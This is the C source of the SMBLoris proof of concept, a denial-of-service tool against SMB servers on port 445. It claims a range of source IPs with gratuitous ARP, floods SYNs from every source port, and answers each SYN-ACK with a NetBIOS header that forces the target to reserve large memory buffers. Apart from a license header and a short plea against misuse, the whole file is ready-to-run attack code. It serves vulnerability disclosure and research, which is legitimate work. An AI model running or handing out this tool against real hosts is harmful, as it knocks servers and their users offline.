/* SMBLoris attack proof-of-concept
 * 
 * Copyright 2017 Hector Martin "marcan" <marcan@marcan.st>
 *
 * Licensed under the terms of the 2-clause BSD license.
 *
 * This is a proof of concept of a publicly disclosed vulnerability.
 * Please do not go around randomly DoSing people with it.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_arp.h>

#define CHECK(cond, name) if (cond) { perror(name); exit(1); }

#define MIN_PORT 1
#define MAX_PORT 65535

struct {
    char *iface;
    uint8_t hwaddr[6];
    uint32_t src_min;
    uint32_t src_max;
    uint32_t dst;
    struct sockaddr_in dst_sa;
} cfg;

int sock;

static void usage(const char *argv0) {
    fprintf(stderr, "Usage: %s <iface> <src_ip_start> <src_ip_end> <dst_ip>\n", argv0);
    exit(1);
}

uint32_t parse_ip(const char *s) {
    int a,b,c,d;
    if (sscanf(s, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) {
        fprintf(stderr, "Failed to parse IPv4 address %s\n", s);
        exit(1);
    }
    return (a<<24) | (b<<16) | (c<<8) | d;
}

uint16_t fold(uint32_t v) {
    return (v & 0xffff) + (v >> 16);
}

uint32_t csum(void *buf, int len)
{
    uint32_t s = 0;
    uint16_t *p = buf;
    while (len) {
        s += *p++;
        len -= 2;
    }
    return s;
}

void get_hwaddr(const char *iface, uint8_t *hwaddr)
{
    int sock = socket(PF_INET, SOCK_PACKET, htons(ETH_P_ARP));
    CHECK(sock < 0, "socket(PF_INET, SOCK_PACKET, ETH_P_ARP)");
    struct ifreq req;
    strncpy(req.ifr_name, iface, sizeof(req.ifr_name));
    CHECK(ioctl(sock, SIOCGIFHWADDR, &req) < 0, "ioctl(SIOCGIFHWADDR)");
    memcpy(cfg.hwaddr, req.ifr_hwaddr.sa_data, 6);
    close(sock);
}

void send_arp(uint32_t addr)
{
    struct sockaddr sa;
    strncpy(sa.sa_data, cfg.iface, sizeof(sa.sa_data));

    struct {
        struct ether_header eth;
        struct arphdr arp;
        uint8_t ar_sha[6];
        uint32_t ar_sip;
        uint8_t ar_tha[6];
        uint32_t ar_tip;
    } __attribute__((packed)) pkt;
    memset(&pkt, 0, sizeof(pkt));
    memset(&pkt.eth.ether_dhost, 0xff, 6);
    memcpy(&pkt.eth.ether_shost, cfg.hwaddr, 6);
    pkt.eth.ether_type = htons(ETHERTYPE_ARP);

    pkt.arp.ar_hrd = htons(1);
    pkt.arp.ar_pro = htons(ETH_P_IP);
    pkt.arp.ar_hln = 6;
    pkt.arp.ar_pln = 4;
    pkt.arp.ar_op = htons(ARPOP_REQUEST);
    memcpy(pkt.ar_sha, cfg.hwaddr, ETH_ALEN);
    pkt.ar_sip = htonl(addr);
    memset(pkt.ar_tha, 0xff, ETH_ALEN);
    pkt.ar_tip = htonl(addr);

    int sock = socket(PF_INET, SOCK_PACKET, htons(ETH_P_ARP));
    CHECK (sock < 0, "socket(PF_INET, SOCK_PACKET, ETH_P_ARP)");
    CHECK(sendto(sock, &pkt, sizeof(pkt), 0, &sa, sizeof(sa)) < 0, "sendto(gratuitous ARP)");
    close(sock);
}

int sent_packets = 0, errors = 0, replies = 0;

void process_replies(int sock, int rsock)
{
    struct {
        struct iphdr ip;
        struct tcphdr tcp;
        uint8_t data[32];
    } reply;

    while (1) {
        int ret = recv(rsock, &reply, sizeof(reply), 0);
        if (ret < 0 && errno == EAGAIN)
            return;
        CHECK(ret < 0, "recv");

        if (reply.ip.saddr != htonl(cfg.dst))
            continue;
        if (ntohl(reply.ip.daddr) < cfg.src_min ||
            ntohl(reply.ip.daddr) > cfg.src_max)
            continue;
        if (reply.ip.protocol != IPPROTO_TCP || reply.tcp.source != htons(445))
            continue;

        struct {
            struct iphdr ip;
            struct tcphdr tcp;
            uint8_t payload[4];
        } __attribute__((packed)) pkt;

        memset(&pkt, 0, sizeof(pkt));

        pkt.ip.ihl = 5;
        pkt.ip.version = 4;
        pkt.ip.ttl = 128;
        pkt.ip.protocol = IPPROTO_TCP;
        pkt.ip.saddr = reply.ip.daddr;
        pkt.ip.daddr = htonl(cfg.dst);
        pkt.tcp.dest = htons(445);
        pkt.tcp.source = reply.tcp.dest;
        pkt.tcp.doff = 5;
        pkt.tcp.window = htons(5840);
        pkt.tcp.ack = 1;
        pkt.tcp.ack_seq = htonl(ntohl(reply.tcp.seq) + 1);
        pkt.tcp.seq = reply.tcp.ack_seq;
        memcpy(pkt.payload, "\x00\x01\xff\xff", 4);

        uint32_t sum = csum(&pkt.ip.saddr, 8) + htons(IPPROTO_TCP) + htons(sizeof(struct tcphdr) + 4) + csum(&pkt.tcp, sizeof(struct tcphdr) + 4);
        pkt.tcp.check = 0xffff - fold(sum);
        if (pkt.tcp.check == 0)
            pkt.tcp.check = 0xffff;
        ret = sendto(sock, &pkt, sizeof pkt, 0, (struct sockaddr*)&cfg.dst_sa, sizeof(cfg.dst_sa));
        if (ret < 0) {
            errors++;
        } else {
            replies++;
        }
    }
}

int main(int argc, char **argv)
{
    if (argc != 5) {
        usage(argv[0]);
    }

    cfg.iface = argv[1];
    cfg.src_min = parse_ip(argv[2]);
    cfg.src_max = parse_ip(argv[3]);
    cfg.dst = parse_ip(argv[4]);

    get_hwaddr(cfg.iface, cfg.hwaddr);
    fprintf(stderr, "Local MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
        cfg.hwaddr[0], cfg.hwaddr[1], cfg.hwaddr[2],
        cfg.hwaddr[3], cfg.hwaddr[4], cfg.hwaddr[5]);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    CHECK(sock < 0, "socket(AF_INET, SOCK_RAW, IPPROTO_RAW)");

    int rsock = socket(AF_PACKET, SOCK_DGRAM | SOCK_NONBLOCK, htons(ETH_P_IP));
    CHECK(rsock < 0, "socket(AF_INET, SOCK_DGRAM, ETH_P_IP)");

    struct {
        struct iphdr ip;
        struct tcphdr tcp;
    } __attribute__((packed)) pkt;

    memset(&pkt, 0, sizeof(pkt));

    pkt.ip.ihl = 5;
    pkt.ip.version = 4;
    pkt.ip.ttl = 128;
    pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = htonl(cfg.dst);
    pkt.tcp.dest = htons(445);
    pkt.tcp.doff = 5;
    pkt.tcp.window = htons(5840);
    pkt.tcp.syn = 1;

    memset(&cfg.dst_sa, 0, sizeof(cfg.dst_sa));

    cfg.dst_sa.sin_family = AF_INET;
    cfg.dst_sa.sin_port = 0;
    cfg.dst_sa.sin_addr.s_addr = htonl(cfg.dst);

    uint32_t src;
    int port;
    for (src = cfg.src_min; src <= cfg.src_max; src++) {
        pkt.ip.saddr = htonl(src);
        pkt.tcp.source = 0;
        pkt.tcp.check = 0;
        uint32_t sum = csum(&pkt.ip.saddr, 8) + htons(IPPROTO_TCP) + htons(sizeof(struct tcphdr)) + csum(&pkt.tcp, sizeof(struct tcphdr));
        send_arp(src);
        for (port = MIN_PORT; port <= MAX_PORT; port++) {
            pkt.tcp.source = htons(port);
            pkt.tcp.check = 0xffff - fold(sum + htons(port));
            if (pkt.tcp.check == 0)
                pkt.tcp.check = 0xffff;
            int ret = sendto(sock, &pkt, sizeof pkt, 0, (struct sockaddr*)&cfg.dst_sa, sizeof(cfg.dst_sa));
            if (ret < 0) {
                errors++;
            }
            sent_packets++;
            if (sent_packets % 100 == 0) {
                fprintf(stderr, "\r%d sent, %d errors, %d replies", sent_packets, errors, replies);
                send_arp(src);
            }
            process_replies(sock, rsock);
        }
    }
    fprintf(stderr, "\n");
}
